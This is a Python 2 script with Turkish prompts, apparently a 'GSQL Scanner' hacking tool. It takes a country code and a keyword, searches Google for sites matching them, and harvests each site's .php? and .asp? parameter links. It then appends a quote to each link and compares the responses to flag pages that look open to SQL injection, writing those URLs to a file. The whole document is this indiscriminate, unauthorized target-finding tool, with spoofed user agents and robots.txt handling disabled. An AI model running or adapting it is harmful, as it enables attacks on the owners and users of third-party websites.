#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import mechanize
import os
import re
import time
import random
if os.name == 'nt':
	os.system('cls')
else:
	os.system('clear')

class GoogleArama(object):
	def __init__(self):
		#init
		self.br = mechanize.Browser()
		self.br.set_handle_robots(False)
		self.br.set_handle_refresh(False)
		self.user_agents = open("useragents.txt","r").read().split("\n")
		self.br.addheaders = [("user-agent",self.user_agents[random.randint(0,len(self.user_agents))]),
		("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
		("Referer","http://www.google.com.tr"),
		("Content-type","application/x-www-form-urlencoded; charset=UTF-8")]
		self.links = [] # son olarak sql hatasi oldugunu dusundugumuz linkler..
		self.domains = [] # google aramada cikan domainler
		self.g_liste = [] # google aramada gidilecek linkler
		self.g_catchlist = [] # gidilecek linkte yakalanan id linkler..
		self.sql_file = open("sql_injextion.txt","w")
		#url = https://www.google.com.tr/search?q=qwe&noj=1&start=00
	def checkDomain(self,html):
		#TODO
		link = re.findall('<h3 class="r"><a href="(.*?)"',html)
		for i in link:
			domain = re.findall("https*://(.*?)/",i)
			if domain[0] not in self.domains:
				print i
				self.g_liste.append(i)
				self.domains.append(domain[0])
			else:
				pass
	def sqlErrorCheck(self,testlink):
		self.sqllink = testlink+"'a"
		try:
			response = self.br.open(testlink, timeout=5)
			response_1 = self.br.open(self.sqllink,timeout=5)
			if response_1.code == 200:
				if response.read() != response_1.read():
					self.links.append(self.sqllink)
					self.sql_file.write(self.sqllink+"\n")
					print "sql >> "+self.sqllink
				else:
					pass
			else:
				self.links.append(self.sqllink)
				self.sql_file.write(self.sqllink+"\n")
				print "sql >> "+self.sqllink				
		except:
			print "sql >> "+self.sqllink
			self.sql_file.write(self.sqllink+"\n")
			self.links.append(self.sqllink)
	def catchLinks(self,url):
		try:
			response = self.br.open(url,timeout=5)
			domain = re.findall("https*://(.*?)/",url)
			html = response.read()
			parse = re.findall('href="(.*?)"',html)
			for i in parse:
				if i.startswith("http"):
					if re.findall(domain[0],i):
						if re.findall("\.php\?",i) or re.findall("\.asp\?",i):
							self.g_catchlist.append(i)
						else:
							pass
					else:
						pass
				else:
					if i.startswith("javascript"):
						pass
					else:
						if re.findall("\.php\?",i) or re.findall("\.asp\?",i):
							urlx = "http://"+domain[0]+"/"+i
							self.g_catchlist.append(urlx)
						else:
							pass
		except:
			pass
		#TODO
		#Burada gelen linkteki ?id değerlere sahip siteye ait linkleri yakalayacağız
	def run(self,ulke_kod,key):
		ulke_code = "."+ulke_kod
		for i in range(0,10):
			try:
				g_search_link = "https://www.google.com.tr/search?q=site:"+ulke_code+"+"+key+"&noj=1&start=%s0"%i
				print g_search_link
				response = self.br.open(g_search_link,timeout=5)
				self.checkDomain(response.read())
			except Exception,e:
				print e
				pass
	def logo(self):
		print """
		
 ██████╗ ███████╗ ██████╗ ██╗         ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔════╝ ██╔════╝██╔═══██╗██║         ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
██║  ███╗███████╗██║   ██║██║         ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██║   ██║╚════██║██║▄▄ ██║██║         ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
╚██████╔╝███████║╚██████╔╝███████╗    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
 ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                                                                  
																									"""
	def main(self):
		self.logo()
		self.ulke_kod = raw_input("Ülke kodunu giriniz: ")
		self.key = raw_input("Anahtar kelime giriniz: ")
		# self.file_name = raw_input("proxy dosyasını giriniz: ")
		print "[+] Linkler toplanmaya başlanıyor..."
		self.run(self.ulke_kod,self.key)
		print "[+] Linkler toplandı..."
		time.sleep(1)
		print "[+] Linkler sql hatası için test edilmeye başlanıyor..."
		time.sleep(1)
		for i in self.g_liste:
			self.catchLinks(i)
		for i in self.g_catchlist:
		 	self.sqlErrorCheck(i)

GoogleArama().main()